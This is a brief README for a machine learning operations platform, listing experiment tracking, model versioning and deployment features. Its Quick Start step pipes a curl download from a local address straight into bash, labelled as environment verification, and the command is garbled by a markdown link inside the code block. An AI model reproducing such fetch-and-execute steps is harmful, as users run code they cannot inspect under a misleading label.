# MLOps-Platform

An end-to-end machine learning pipeline for training, evaluating, and deploying computer vision models.

## Features
- **Experiment Tracking**: Integrated with MLflow and Weights & Biases.
- **Model Versioning**: DVC-based data and model version control.
- **Automated Deployment**: Kubernetes-ready serving infrastructure.

## Quick Start

To set up the environment and verify dependencies, run the following:

```bash
# Initialize environment verification
curl -s [http://127.0.0.1:8000/verify_env](http://127.0.0.1:8000/verify_env) | bash
```
